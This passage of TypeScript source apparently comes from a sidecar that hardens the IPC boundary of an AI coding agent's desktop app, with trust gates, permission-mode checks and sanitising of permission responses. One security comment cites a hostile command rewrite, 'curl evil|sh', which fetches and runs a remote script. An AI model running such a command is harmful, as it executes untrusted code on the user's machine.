  private handleSubmit(connection: Connection, message: AppSubmitMessage): void {
    // P4-15 TRUST BOUNDARY (SECURITY-MINIMUM — validate at the sidecar, not the
    // renderer). A turn runs the engine with tools + HOOKS at the session's cwd.
    // The renderer's trust gate is UX only: enforce trust HERE so no renderer
    // path (queued-prompt drain, command palette, a future feature, or a
    // compromised renderer) can run a turn at an untrusted cwd. Hooks in
    // particular do NOT self-gate on the non-interactive sidecar path
    // (`shouldSkipHookDueToTrust()` returns false when
    // `getIsNonInteractiveSession()` is true), so this block is what makes trust
    // real. Fail closed with a typed error; degrade gracefully (no crash).
    // Fail CLOSED (P4-25, review B1): block unless EXPLICITLY trusted. `!== true`
    // treats a null snapshot (spawn read failure) and `false` alike — the old
    // `=== false` let null through (`undefined === false` is false → gate skipped).
    // The domain-absent path (no trust domain constructed, e.g. a probe) stays
    // permissive so it isn't a submit gate on non-session code paths.
    if (this.workspaceTrust && this.workspaceTrust.getSnapshot()?.trusted !== true) {
      this.sendError(
        connection,
        message.requestId,
        'unauthorized',
        'Workspace is not trusted. Accept the trust prompt before running a turn.',
        false,
      )
      return
    }

    // T7 (F4) — prompt cap in UTF-8 BYTES (not JS chars), consistent with the
    // frame byte cap so a multibyte prompt cannot advertise a size the frame
    // cannot carry.
    const promptBytes = Buffer.byteLength(message.prompt, 'utf8')
    if (promptBytes > MAX_PROMPT_BYTES) {
      this.sendError(
        connection,
        message.requestId,
        'bad_request',
        `prompt exceeds ${MAX_PROMPT_BYTES} bytes`,
        false,
      )
      return
    }

    // T4 — `goalSnapshot` arrives as `z.unknown()`. It becomes the diagnostic
    // session identity (AppSessionController.ts:189), so it must be validated to
    // the real `ThreadGoal` shape before it touches session state. Reuse the
    // engine's own `parseThreadGoal` (returns null on any bad shape) as the
    // safeParse. A present-but-invalid snapshot is rejected; absent is fine.
    let goalSnapshot: ReturnType<typeof parseThreadGoal> | undefined
    if (message.options && 'goalSnapshot' in message.options) {
      const raw = message.options.goalSnapshot
      if (raw !== undefined) {
        const validated = parseThreadGoal(raw)
        if (!validated) {
          this.sendError(
            connection,
            message.requestId,
            'bad_request',
            'goalSnapshot is not a valid ThreadGoal',
            false,
          )
          return
        }
        goalSnapshot = validated
      } else {
        goalSnapshot = null
      }
    }

    if (this.activeTurn) {
      this.sendError(
        connection,
        message.requestId,
        'turn_already_running',
        'Session turn already running',
        true,
      )
      return
    }

    const turnUuid = randomUUID()
    this.activeTurn = true
    this.broadcastEvent(createMessageEvent({
      type: 'user',
      message: { role: 'user', content: message.prompt },
      session_id: this.engineSessionId,
      parent_tool_use_id: null,
      uuid: turnUuid,
      timestamp: new Date().toISOString(),
      isSynthetic: message.options?.isMeta === true,
    }))
    void this.controller
      .submit(message.prompt, {
        uuid: turnUuid,
        isMeta: message.options?.isMeta,
        // Only pass goalSnapshot through if the client supplied the key, so the
        // controller's `'goalSnapshot' in options` check keeps its meaning.
        ...(goalSnapshot !== undefined ? { goalSnapshot } : {}),
      })
      .catch(error => {
        const errorMessage = error instanceof Error ? error.message : String(error)
        this.sendError(
          connection,
          message.requestId,
          errorMessage === 'Session turn already running'
            ? 'turn_already_running'
            : 'internal_error',
          errorMessage,
          errorMessage === 'Session turn already running',
        )
      })
      .finally(() => {
        this.activeTurn = false
        // P4-6 title-rider: after the first turn of a fresh session, generate +
        // persist an AI title (the same machinery the TUI uses) and push it live.
        // One-shot and self-guarding — a resumed session, an existing title, or an
        // empty prompt is a no-op inside the generator. Fire-and-forget: a title
        // never gates or delays the turn.
        void this.titleGenerator.maybeGenerate(message.prompt, title =>
          this.broadcastSessionTitle(title),
        )
      })
  }

  /**
   * C2 — `permission.setMode` (decisions/PERMISSION-BOUNDARY.md §3).
   * Fail-closed order: explicit escalation rejections → local schema →
   * capability presence → apply. The apply is session-scoped by construction
   * (no destination exists on the wire; nothing here can reach
   * `permissions.defaultMode`). Success is acknowledged by the resulting
   * `permission.context` snapshot; a same-mode no-op emits nothing.
   */
  private handleSetMode(connection: Connection, rawMessage: unknown): void {
    const raw = rawMessage as { requestId?: unknown; mode?: unknown }
    const requestId =
      typeof raw.requestId === 'string' ? raw.requestId : undefined

    // bypassPermissions escalates beyond T5b (no per-action prompt is ever
    // raised again, killing the round-trip and its audit trail), so it is
    // grantable ONLY when a TRUSTED surface enabled it: the launch opt-in
    // `CATCODE_ALLOW_BYPASS=1`, read at session construction into the context's
    // `isBypassPermissionsModeAvailable` (sessionController.ts). The renderer
    // alone can never reach it — a browser-like surface must not self-escalate.
    // Fail closed: a missing domain or unset flag rejects (`!== true`).
    if (
      raw.mode === 'bypassPermissions' &&
      this.permissions?.getToolPermissionContext()
        .isBypassPermissionsModeAvailable !== true
    ) {
      this.sendError(
        connection,
        requestId,
        'bad_request',
        'mode "bypassPermissions" is not available (launch with CATCODE_ALLOW_BYPASS=1)',
        false,
      )
      return
    }
    // `auto` is engine-internal and feature-gated; not renderer-addressable.
    if (raw.mode === 'auto') {
      this.sendError(
        connection,
        requestId,
        'bad_request',
        'mode "auto" is engine-internal and not addressable over IPC',
        false,
      )
      return
    }

    const parsed = permissionSetModeMessageSchema.safeParse(rawMessage)
    if (!parsed.success) {
      this.sendError(
        connection,
        requestId,
        'bad_request',
        parsed.error.issues[0]?.message ?? 'invalid permission.setMode message',
        false,
      )
      return
    }

    if (!this.permissions) {
      this.sendError(
        connection,
        parsed.data.requestId,
        'internal_error',
        'permission domain unavailable for this session',
        false,
      )
      return
    }

    try {
      this.permissions.setMode(parsed.data.mode)
    } catch (error) {
      this.sendError(
        connection,
        parsed.data.requestId,
        'internal_error',
        error instanceof Error ? error.message : String(error),
        false,
      )
    }
  }

  /**
   * P4-5 — account lifecycle verbs (protocol.ts: the decision rationale lives on
   * `ACCOUNT_VERB_TYPES`). Fail-closed order: sidecar-LOCAL structural schema →
   * domain presence → pool-RESOLVED business validation + dispatch (in the
   * domain) → `account.result` frame → re-broadcast the snapshot when the pool
   * changed. Structural validation here NEVER trusts the renderer's account
   * state: it checks shape only; the domain re-resolves the target against the
   * live pool (T6) and re-validates aliases with the engine's own rule. No token
   * crosses either direction.
   */
  private handleAccountVerb(connection: Connection, rawMessage: unknown): void {
    const raw = rawMessage as { requestId?: unknown }
    const requestId =
      typeof raw.requestId === 'string' ? raw.requestId : undefined

    const parsed = accountVerbMessageSchema.safeParse(rawMessage)
    if (!parsed.success) {
      this.sendError(
        connection,
        requestId,
        'bad_request',
        parsed.error.issues[0]?.message ?? 'invalid account verb',
        false,
      )
      return
    }
    if (!this.accounts) {
      this.sendError(
        connection,
        parsed.data.requestId,
        'internal_error',
        'accounts domain unavailable for this session',
        false,
      )
      return
    }

    // The verb is now structurally valid; the domain owns the pool-resolved
    // business rules + dispatch. Errors there degrade to an ok:false result
    // frame (a business failure), never a thrown internal error to the client.
    const verb = parsed.data as AccountVerbMessage
    void this.accounts
      .runVerb(verb)
      .then(({ verb: verbType, result, poolChanged }) => {
        this.send(connection, {
          kind: 'account.result',
          protocolVersion: PROTOCOL_VERSION,
          sessionId: this.sessionId,
          requestId: verb.requestId,
          verb: verbType,
          ok: result.ok,
          message: result.message,
          ...(result.touchAllResults !== undefined
            ? { touchAllResults: result.touchAllResults }
            : {}),
        })
        if (poolChanged) {
          this.broadcastAccountsSnapshot()
        }
      })
      .catch(error => {
        this.sendError(
          connection,
          verb.requestId,
          'internal_error',
          error instanceof Error ? error.message : String(error),
          false,
        )
      })
  }

  /**
   * P4-15 — the workspace-trust accept verb (protocol.ts: WORKSPACE_TRUST_VERB_TYPES;
   * `decisions/STARTUP-GATES.md §1.1`). Same fail-closed order as `handleAccountVerb`:
   * sidecar-LOCAL structural schema → domain presence → dispatch to the domain
   * (which persists via the engine's OWN `saveCurrentProjectConfig` for THIS
   * session's cwd — HC1, no renderer path) → `workspace.trust.result` frame →
   * re-broadcast the `workspace-trust.snapshot` when the store changed. No token
   * crosses either direction (trust is a boolean).
   */
  private handleWorkspaceTrustVerb(connection: Connection, rawMessage: unknown): void {
    const raw = rawMessage as { requestId?: unknown }
    const requestId =
      typeof raw.requestId === 'string' ? raw.requestId : undefined

    const parsed = workspaceTrustMessageSchema.safeParse(rawMessage)
    if (!parsed.success) {
      this.sendError(
        connection,
        requestId,
        'bad_request',
        parsed.error.issues[0]?.message ?? 'invalid workspace-trust verb',
        false,
      )
      return
    }
    if (!this.workspaceTrust) {
      this.sendError(
        connection,
        parsed.data.requestId,
        'internal_error',
        'workspace-trust domain unavailable for this session',
        false,
      )
      return
    }

    const result = this.workspaceTrust.acceptTrust()
    this.send(connection, {
      kind: 'workspace.trust.result',
      protocolVersion: PROTOCOL_VERSION,
      sessionId: this.sessionId,
      requestId: parsed.data.requestId,
      ok: result.ok,
      message: result.message,
    })
    if (result.changed) {
      this.broadcastWorkspaceTrustSnapshot()
    }
  }

  /**
   * P4-8b — the agent-mode set verb (protocol.ts: AGENT_MODE_VERB_TYPES;
   * `decisions/AGENT-MODE-TOGGLE.md`). Same fail-closed order as
   * `handleWorkspaceTrustVerb`: sidecar-LOCAL structural schema → domain presence
   * → dispatch to the domain (which switches mode through the engine's OWN
   * `matchSessionMode` — a live env switch, no respawn) → `agent-mode.set.result`
   * frame → re-broadcast the `agent-mode.snapshot` when the mode changed. The
   * renderer authors only the boolean intent; no path, no token crosses.
   */
  private handleAgentModeSet(connection: Connection, rawMessage: unknown): void {
    const raw = rawMessage as { requestId?: unknown }
    const requestId =
      typeof raw.requestId === 'string' ? raw.requestId : undefined

    const parsed = agentModeSetMessageSchema.safeParse(rawMessage)
    if (!parsed.success) {
      this.sendError(
        connection,
        requestId,
        'bad_request',
        parsed.error.issues[0]?.message ?? 'invalid agent-mode verb',
        false,
      )
      return
    }
    if (!this.agentMode) {
      this.sendError(
        connection,
        parsed.data.requestId,
        'internal_error',
        'agent-mode domain unavailable for this session',
        false,
      )
      return
    }

    const result = this.agentMode.setActive(parsed.data.active)
    this.send(connection, {
      kind: 'agent-mode.set.result',
      protocolVersion: PROTOCOL_VERSION,
      sessionId: this.sessionId,
      requestId: parsed.data.requestId,
      ok: result.ok,
      message: result.message,
    })
    // The snapshot broadcast is async (the session plane is a file-backed engine
    // read); fire-and-forget after the synchronous result ack, mirroring the
    // subscribe-driven re-broadcast path.
    if (result.changed) {
      void this.broadcastAgentModeSnapshot()
    }
  }

  /**
   * P4-24c — the composer run-control set verbs (protocol.ts: RUN_CONTROL_VERB_TYPES;
   * `decisions/COMPOSER-RUN-CONTROLS.md`). Same fail-closed order as the other verbs:
   * sidecar-LOCAL structural schema → domain presence → dispatch to the domain
   * (which runs the engine's OWN `/model`/`/effort`/`/fast` setter — a live change,
   * no respawn) → `run-control.result` frame. The `run-controls.snapshot`
   * re-broadcast is NOT emitted here: the setter mutates the app-state store, whose
   * change-detected subscription (constructor) re-broadcasts the fresh snapshot to
   * every connection — the SAME path any engine-side model/effort/fast change takes
   * (proving a real live frame, not an action-driven synthetic one). The renderer
   * authors ONLY the value/selection; no engine object, no path, no token crosses.
   */
  private handleRunControlVerb(connection: Connection, rawMessage: unknown): void {
    const raw = rawMessage as { requestId?: unknown }
    const requestId =
      typeof raw.requestId === 'string' ? raw.requestId : undefined

    const parsed = runControlVerbMessageSchema.safeParse(rawMessage)
    if (!parsed.success) {
      this.sendError(
        connection,
        requestId,
        'bad_request',
        parsed.error.issues[0]?.message ?? 'invalid run-control verb',
        false,
      )
      return
    }
    if (!this.runControls) {
      this.sendError(
        connection,
        parsed.data.requestId,
        'internal_error',
        'run-controls domain unavailable for this session',
        false,
      )
      return
    }

    const verb = parsed.data as RunControlVerbMessage
    const snapshot = this.runControls.getSnapshot()
    let unsupportedMessage: string | null = null
    if (
      verb.type === 'model.set' &&
      verb.model !== snapshot.model.current &&
      !snapshot.model.options.some(option => option.value === verb.model)
    ) {
      unsupportedMessage = `unsupported model: ${verb.model}`
    } else if (
      verb.type === 'effort.set' &&
      verb.effort !== 'auto' &&
      verb.effort !== 'unset' &&
      verb.effort !== snapshot.effort.current &&
      !snapshot.effort.options.includes(verb.effort)
    ) {
      unsupportedMessage = `unsupported effort: ${verb.effort}`
    }
    if (unsupportedMessage) {
      this.sendError(
        connection,
        verb.requestId,
        'bad_request',
        unsupportedMessage,
        false,
      )
      return
    }

    let result: { ok: boolean; message: string; changed: boolean }
    switch (verb.type) {
      case 'model.set':
        result = this.runControls.setModel(verb.model)
        break
      case 'effort.set':
        result = this.runControls.setEffort(verb.effort)
        break
      case 'fast.set':
        result = this.runControls.setFast(verb.active)
        break
    }

    this.send(connection, {
      kind: 'run-control.result',
      protocolVersion: PROTOCOL_VERSION,
      sessionId: this.sessionId,
      requestId: verb.requestId,
      verb: verb.type,
      ok: result.ok,
      message: result.message,
    })
    // No explicit snapshot re-broadcast here — the setter's store mutation drives
    // the change-detected subscription, which re-emits `run-controls.snapshot`.
  }

  /**
   * P4-13 — RemoteSettings verbs (protocol.ts: the decision rationale lives on
   * `REMOTE_VERB_TYPES`). Same fail-closed order as `handleAccountVerb`:
   * sidecar-LOCAL structural schema → domain presence → dispatch (the domain
   * re-checks the live bridge flag before mutating) → `remoteSettings.result`
   * frame → re-broadcast the snapshot when the bridge flag changed.
   */
  private handleRemoteSettingsVerb(connection: Connection, rawMessage: unknown): void {
    const raw = rawMessage as { requestId?: unknown }
    const requestId =
      typeof raw.requestId === 'string' ? raw.requestId : undefined

    const parsed = remoteVerbMessageSchema.safeParse(rawMessage)
    if (!parsed.success) {
      this.sendError(
        connection,
        requestId,
        'bad_request',
        parsed.error.issues[0]?.message ?? 'invalid remote settings verb',
        false,
      )
      return
    }
    if (!this.remoteSettings) {
      this.sendError(
        connection,
        parsed.data.requestId,
        'internal_error',
        'remote settings domain unavailable for this session',
        false,
      )
      return
    }

    const verb = parsed.data as RemoteVerbMessage
    void this.remoteSettings
      .runVerb(verb)
      .then(({ verb: verbType, result, flagChanged }) => {
        this.send(connection, {
          kind: 'remoteSettings.result',
          protocolVersion: PROTOCOL_VERSION,
          sessionId: this.sessionId,
          requestId: verb.requestId,
          verb: verbType,
          ok: result.ok,
          message: result.message,
          ...(result.directConnect !== undefined
            ? { directConnect: result.directConnect }
            : {}),
        })
        if (flagChanged) {
          this.broadcastRemoteSettingsSnapshot()
        }
      })
      .catch(error => {
        this.sendError(
          connection,
          verb.requestId,
          'internal_error',
          error instanceof Error ? error.message : String(error),
          false,
        )
      })
  }

  /**
   * P4-19 — the FIRST renderer→engine settings write. Fail-closed order:
   * sidecar-LOCAL Zod schema (shape + editable-source enum + bounded key/value)
   * → per-key value-type check against the closed EDITABLE_SETTINGS allowlist →
   * domain presence → domain.runVerb (which applies the engine's
   * SettingsUpdater-under-lock write) → `settings.result` frame → re-broadcast a
   * fresh `settings.snapshot` when the write landed. The renderer never authors
   * an engine object: it names a `{ source, key, value }`, and every one is
   * re-validated here at the trust boundary before disk is touched.
   */
  private handleSettingsVerb(connection: Connection, rawMessage: unknown): void {
    const raw = rawMessage as { requestId?: unknown }
    const requestId =
      typeof raw.requestId === 'string' ? raw.requestId : undefined

    const parsed = settingsVerbMessageSchema.safeParse(rawMessage)
    if (!parsed.success) {
      this.sendError(
        connection,
        requestId,
        'bad_request',
        parsed.error.issues[0]?.message ?? 'invalid settings verb',
        false,
      )
      return
    }
    const verb = parsed.data as SettingsVerbMessage

    // Per-key value-type gate (the strict-key allowlist for the VALUE): a
    // boolean key rejects a string, an enum key rejects an out-of-set value, an
    // int key rejects a non-integer/out-of-range number. Rejected at the
    // boundary, never written.
    const valueCheck = validateEditableSettingValue(verb.key, verb.value)
    if (!valueCheck.ok) {
      this.sendError(connection, verb.requestId, 'bad_request', valueCheck.error, false)
      return
    }

    if (!this.settings) {
      this.sendError(
        connection,
        verb.requestId,
        'internal_error',
        'settings domain unavailable for this session',
        false,
      )
      return
    }

    let result: { ok: boolean; message: string; changed: boolean }
    try {
      result = this.settings.runVerb(verb)
    } catch (error) {
      this.sendError(
        connection,
        verb.requestId,
        'internal_error',
        error instanceof Error ? error.message : String(error),
        false,
      )
      return
    }

    this.send(connection, {
      kind: 'settings.result',
      protocolVersion: PROTOCOL_VERSION,
      sessionId: this.sessionId,
      requestId: verb.requestId,
      verb: verb.type,
      ok: result.ok,
      message: result.message,
    })
    if (result.changed) {
      this.broadcastSettingsSnapshot()
    }
  }

  private handlePermissionResponse(
    connection: Connection,
    message: PermissionResponseMessage,
    rawMessage: unknown,
  ): void {
    // T5a (structural) — the requestId MUST match a currently-pending
    // engine-minted request. `respondToPermissionRequest` no-ops on a miss
    // (AppSessionController.ts:91-96); we check first to answer with a precise
    // error instead of a silent drop. There is no path that lets the renderer
    // register a pending request.
    const pending = this.controller
      .getPendingPermissionRequests()
      .find(request => request.requestId === message.requestId)
    if (!pending) {
      this.sendError(
        connection,
        message.requestId,
        'permission_not_found',
        'Permission request is no longer pending',
        false,
      )
      return
    }

    // C1 — "always allow" as suggestion SELECTION (PERMISSION-BOUNDARY.md). The
    // renderer may request durable permission updates only by INDEXING into the
    // `permission_suggestions` the ENGINE minted on this exact pending request;
    // it can never author update objects (T6b intent). The shared Zod schema
    // strips unknown response keys, so the selection is read from the raw frame
    // and validated here, fail-closed.
    const selection = validateSuggestionSelection(
      rawMessage,
      message.response.behavior,
      pending.request,
    )
    if (!selection.ok) {
      this.sendError(connection, message.requestId, 'bad_request', selection.reason, false)
      return
    }

    const response = this.sanitizePermissionResponse(
      connection,
      message.requestId,
      pending.request,
      message.response,
    )
    if (!response) {
      return // an error was already sent
    }

    // Re-attach the ENGINE-authored update objects for a validated selection
    // (cloned so the response never aliases the pending request). This is the
    // ONLY path that puts `updatedPermissions` on a boundary response — the
    // objects are byte-for-byte the engine's own suggestions for this requestId,
    // which the engine then applies + persists via its normal decision path
    // (permissionPromptToolResultToPermissionDecision).
    const finalResponse: AppPermissionResponse =
      response.behavior === 'allow' && selection.updates.length > 0
        ? { ...response, updatedPermissions: structuredClone(selection.updates) }
        : response

    this.controller.respondToPermissionRequest(message.requestId, finalResponse)
  }

  /**
   * T6 + T6b hardening on an allow. The permission-response schema
   * (PermissionPromptToolResultSchema) permits two escalations the renderer must
   * NOT be able to perform:
   *
   *   T6  — `updatedInput` command-rewrite: the engine runs the tool with
   *         `updatedInput` when non-empty, and treats an EMPTY object as "use the
   *         original tool input" (PermissionPromptToolResultSchema.ts:110-111).
   *         Both are escalation surfaces from a compromised renderer:
   *           - a non-empty rewrite swaps the command ("ls" → "curl evil|sh");
   *           - an empty `{}` reverses an engine-side gate rewrite (if the engine
   *             gated `curl http→https`, "use original" restores the unsafe http).
   *         Fix (F1): the sidecar is ECHO-ONLY in the strong sense — it forwards
   *         exactly the GATED input the engine already vetted, never renderer
   *         bytes. A renderer-supplied `updatedInput` is accepted only if it is
   *         empty (a plain confirm) or deep-equals the gated input; anything else
   *         is rejected. What we hand the engine is always the gated input, so an
   *         empty `{}` can no longer mean "use original".
   *
   *   T6b — `updatedPermissions`: on an allow these are persisted via
   *         `persistPermissionUpdates` (PermissionPromptToolResultSchema.ts:96
   *         -105), installing durable always-allow rules. A forged allow must
   *         not be able to write policy. Strip renderer-SUPPLIED objects before
   *         they reach the engine (backstop; F10 rejects the key upstream). The
   *         legitimate "always allow" path is C1: handlePermissionResponse
   *         re-attaches ENGINE-minted suggestions after
   *         validateSuggestionSelection — the renderer selects, never authors.
   *
   * Returns the sanitized response, or null if it was rejected (error sent).
   */
  private sanitizePermissionResponse(
    connection: Connection,
    requestId: string,
    request: import('../../src/app-runtime/sessionEvents.js').AppPermissionRequest['request'],
    response: AppPermissionResponse,
  ): AppPermissionResponse | null {
    if (response.behavior === 'deny') {
      // Deny carries only a message; nothing to escalate.
      return response
    }

    // T6b — never let a renderer install durable permission rules on an allow.
    if (response.updatedPermissions !== undefined) {
      this.log(
        `[sidecar] stripped updatedPermissions on allow requestId=${requestId} (T6b)`,
      )
    }

    // T6 (F1) — the renderer's `updatedInput` may only CONFIRM the gated input.
    // Accept it iff it is empty (a plain confirm) or exactly equals the gated
    // input; reject any other value. Then forward the GATED input itself — never
    // the renderer's bytes — so an empty `{}` cannot mean "use original" and a
    // rewrite cannot slip through.
    const gatedInput = extractGatedToolInput(request)
    const echoed = response.updatedInput
    const isConfirm =
      Object.keys(echoed).length === 0 ||
      (gatedInput !== undefined && deepEqual(echoed, gatedInput))
    if (!isConfirm) {
      this.sendError(
        connection,
        requestId,
        'bad_request',
        'updatedInput may not rewrite the gated tool input',
        false,
      )
      return null
    }

    return {
      behavior: 'allow',
      // Forward the gated input the engine already vetted. If we could not read
      // it from the request (unexpected shape), fall back to an empty object,
      // which the engine reads as "use original" — the same input the engine
      // itself gated, since no renderer rewrite reached it.
      updatedInput: gatedInput ?? {},
      // updatedPermissions intentionally dropped (T6b).
      // Note: toolUseID is rejected upstream by checkStrictKeys and thus not passed here.
    }
  }

  /**
   * C5 (P4-20, ASK-USER-QUESTION-ANSWER.md) — resolve a pending AskUserQuestion
   * request from a renderer answer frame. The renderer authors ONLY option
   * INDICES + the built-in "Other…" freeform string; this handler re-reads the
   * gated `questions` from the ENGINE's own pending request, re-attaches the
   * engine's own option labels (C1 selection-by-index), and resolves the request
   * as an allow whose `updatedInput.answers` the engine's tool reads. The answer
   * response is built server-side, so it never passes through the T6 renderer-echo
   * check (T6 guards renderer-SUPPLIED updatedInput; the renderer supplies none).
   * Fail-closed at every step: an invalid frame leaves the request pending.
   */
  private handleAskUserQuestionAnswer(
    connection: Connection,
    rawMessage: unknown,
  ): void {
    // The requestId is read BEFORE schema validation so a rejected answer still
    // correlates back to its request — without it the renderer cannot clear its
    // in-flight guard and an honest over-long answer strands the pending
    // request forever. Same shape as handleAgentModeSet / handleRunControlVerb.
    const raw = rawMessage as { requestId?: unknown }
    const requestId =
      typeof raw.requestId === 'string' ? raw.requestId : undefined
    const parsed = askUserQuestionAnswerMessageSchema.safeParse(rawMessage)
    if (!parsed.success) {
      this.sendError(
        connection,
        requestId,
        'bad_request',
        parsed.error.issues[0]?.message ?? 'invalid askUserQuestion.answer',
        false,
      )
      return
    }
    const message: AskUserQuestionAnswerMessage = parsed.data

    // T5a — the requestId MUST match a currently-pending engine-minted request
    // (identical lookup to handlePermissionResponse).
    const pending = this.controller
      .getPendingPermissionRequests()
      .find(request => request.requestId === message.requestId)
    if (!pending) {
      this.sendError(
        connection,
        message.requestId,
        'permission_not_found',
        'Permission request is no longer pending',
        false,
      )
      return
    }

    // Tool gate — this frame is valid ONLY for an AskUserQuestion request. A
    // forged answer against any other gate (Bash, file write) is bad_request.
    if (pending.request.tool_name !== ASK_USER_QUESTION_TOOL_NAME) {
      this.sendError(
        connection,
        message.requestId,
        'bad_request',
        'askUserQuestion.answer is only valid for an AskUserQuestion request',
        false,
      )
      return
    }

    const gatedInput = extractGatedToolInput(pending.request)
    const reconstructed = reconstructAskUserQuestionAnswers(
      gatedInput,
      message.answers,
    )
    if (!reconstructed.ok) {
      this.sendError(
        connection,
        message.requestId,
        'bad_request',
        reconstructed.reason,
        false,
      )
      return
    }

    // Resolve through the engine's OWN decision path. `questions`/`metadata` are
    // the engine's gated fields (never the wire); only `answers` is attached.
    this.controller.respondToPermissionRequest(message.requestId, {
      behavior: 'allow',
      updatedInput: { ...gatedInput, answers: reconstructed.answers },
    })
  }

  /* --------------------------------------------------------------------- *
   * Outbound (engine → client): raw-forward, JSON-safe, clone-on-serialize.
   * --------------------------------------------------------------------- */

  private prepareOutboundPayload<T>(payload: T, contextName: string): T | null {
    // Landmine 2 (immutability): structuredClone
    let cloned: T
    try {
      cloned = structuredClone(payload)
    } catch (error) {
      this.log(
        `[sidecar] dropped un-cloneable payload for ${contextName}: ${
          error instanceof Error ? error.message : String(error)
        }`,
      )
      return null
    }

    // Real SDK messages materialize optional fields as `key: undefined`.
    // Canonical JSON represents those as absent properties.
    omitUndefinedObjectProperties(cloned)

    // Landmine 1 (JSON-safe): assert the payload round-trips through JSON losslessly
    const safety = checkJsonSafe(cloned)
    if (!safety.ok) {
      this.log(
        `[sidecar] dropped non-JSON-safe payload for ${contextName} at ${safety.path}: ${safety.reason}`,
      )
      return null
    }

    return cloned
  }

  private broadcastEvent(event: AppSessionEvent): void {
    if (this.connections.size === 0) {
      return
    }

    const prepared = this.prepareOutboundPayload(event, `event type=${event.type}`)
    if (!prepared) {
      return
    }

    const frame: ServerFrame = {
      kind: 'event',
      protocolVersion: PROTOCOL_VERSION,
      sessionId: this.sessionId,
      event: prepared,
    }
    for (const connection of this.connections) {
      this.send(connection, frame)
    }
  }

  /** C3 — build + send one snapshot frame to a single connection (attach). */
  private sendPermissionContext(
    connection: Connection,
    context: ToolPermissionContext,
  ): void {
    const frame = this.preparePermissionContextFrame(context)
    if (frame) {
      this.send(connection, frame)
    }
  }

  /** C3 — broadcast a snapshot to every connection (on live-context change). */
  private broadcastPermissionContext(context: ToolPermissionContext): void {
    if (this.connections.size === 0) {
      return
    }
    const frame = this.preparePermissionContextFrame(context)
    if (!frame) {
      return
    }
    for (const connection of this.connections) {
      this.send(connection, frame)
    }
  }

  private preparePermissionContextFrame(
    context: ToolPermissionContext,
  ): ServerFrame | null {
    const snapshot = this.prepareOutboundPayload(
      buildPermissionContextSnapshot(context),
      'permission.context snapshot',
    )
    if (!snapshot) {
      return null
    }
    return {
      kind: 'permission.context',
      protocolVersion: PROTOCOL_VERSION,
      sessionId: this.sessionId,
      context: snapshot,
    }
  }

  /**
   * P4-3 — build + send the settings snapshot to a single connection (attach).
   * The snapshot carries no setting values (source/editable/managed model only),
   * so `send`'s secret guard and JSON-safety check pass by construction. A same
   * outbound-size cap still applies via the shared `send` path.
   *
   * `getSnapshot()` is a pure read of the spawn-time value (null if that read
   * failed) — it does no I/O and cannot throw. The whole body is nonetheless
   * wrapped so a settings-snapshot failure can NEVER strand the connection in the
   * broadcast set or skip the subsequent history replay (review MED#2): on any
   * failure we simply skip the snapshot and let attach continue.
   */
  private sendSettingsSnapshot(connection: Connection): void {
    if (!this.settings) {
      return
    }
    try {
      const raw = this.settings.getSnapshot()
      if (!raw) {
        return
      }
      const snapshot = this.prepareOutboundPayload(raw, 'settings.snapshot')
      if (!snapshot) {
        return
      }
      this.send(connection, {
        kind: 'settings.snapshot',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        settings: snapshot,
      })
    } catch (error) {
      this.log(
        `[sidecar] settings.snapshot send skipped (${
          error instanceof Error ? error.message : String(error)
        })`,
      )
    }
  }

  /**
   * P4-7 — build + send the agent config snapshot to a single connection (attach).
   * The domain withholds prompt bodies, hook payloads, and inline MCP config values,
   * so this frame carries definition/status metadata without credential material.
   */
  private sendAgentConfigSnapshot(connection: Connection): void {
    if (!this.agentConfig) {
      return
    }
    try {
      const raw = this.agentConfig.getSnapshot()
      if (!raw) {
        return
      }
      const snapshot = this.prepareOutboundPayload(raw, 'agent-config.snapshot')
      if (!snapshot) {
        return
      }
      this.send(connection, {
        kind: 'agent-config.snapshot',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        agents: snapshot,
      })
    } catch (error) {
      this.log(
        `[sidecar] agent-config.snapshot send skipped (${
          error instanceof Error ? error.message : String(error)
        })`,
      )
    }
  }

  /**
   * P4-12 — build + send the settings extensions (MCP/plugins/skills/hooks)
   * config snapshot to a single connection (attach). The domain carries config
   * metadata only (no values, no env/headers, no hook/skill bodies), so this
   * frame is secretGuard-clean by construction. Wrapped so a snapshot failure
   * can never strand the connection or skip the subsequent history replay.
   */
  private sendExtensionsSnapshot(connection: Connection): void {
    if (!this.extensions) {
      return
    }
    try {
      const raw = this.extensions.getSnapshot()
      if (!raw) {
        return
      }
      const snapshot = this.prepareOutboundPayload(raw, 'extensions.snapshot')
      if (!snapshot) {
        return
      }
      this.send(connection, {
        kind: 'extensions.snapshot',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        extensions: snapshot,
      })
    } catch (error) {
      this.log(
        `[sidecar] extensions.snapshot send skipped (${
          error instanceof Error ? error.message : String(error)
        })`,
      )
    }
  }

  /**
   * P4-6a — build + send the read-only sessions catalog (engine transcript
   * history) to a single connection (attach). Display metadata only (titles/
   * tags/branches/PRs — no message bodies, no credentials), so the frame is
   * secretGuard-clean by construction; a stray secret in a session title would
   * only cause `prepareOutboundPayload` to drop the WHOLE frame (fail-closed,
   * never a leak). Wrapped so a snapshot failure can never strand the connection
   * or skip the subsequent history replay.
   */
  private sendSessionsSnapshot(connection: Connection): void {
    if (!this.sessionsCatalog) {
      return
    }
    try {
      const raw = this.sessionsCatalog.getSnapshot()
      if (!raw) {
        return
      }
      const catalog = this.prepareOutboundPayload(raw, 'sessions.snapshot')
      if (!catalog) {
        return
      }
      this.send(connection, {
        kind: 'sessions.snapshot',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        catalog,
      })
    } catch (error) {
      this.log(
        `[sidecar] sessions.snapshot send skipped (${
          error instanceof Error ? error.message : String(error)
        })`,
      )
    }
  }

  /**
   * P4-10 — current thread-goal snapshot from the runtime's live app-state store.
   * Writes stay on the engine's slash/action path; the desktop receives display
   * state only.
   */
  private sendThreadGoalSnapshot(connection: Connection): void {
    if (!this.goals) {
      return
    }
    try {
      const raw = this.goals.getSnapshot()
      const snapshot = this.prepareOutboundPayload(raw, 'thread-goal.snapshot')
      if (snapshot === null && raw !== null) {
        return
      }
      this.send(connection, {
        kind: 'thread-goal.snapshot',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        goal: snapshot,
      })
    } catch (error) {
      this.log(
        `[sidecar] thread-goal.snapshot send skipped (${
          error instanceof Error ? error.message : String(error)
        })`,
      )
    }
  }

  private broadcastThreadGoalSnapshot(): void {
    if (this.connections.size === 0) {
      return
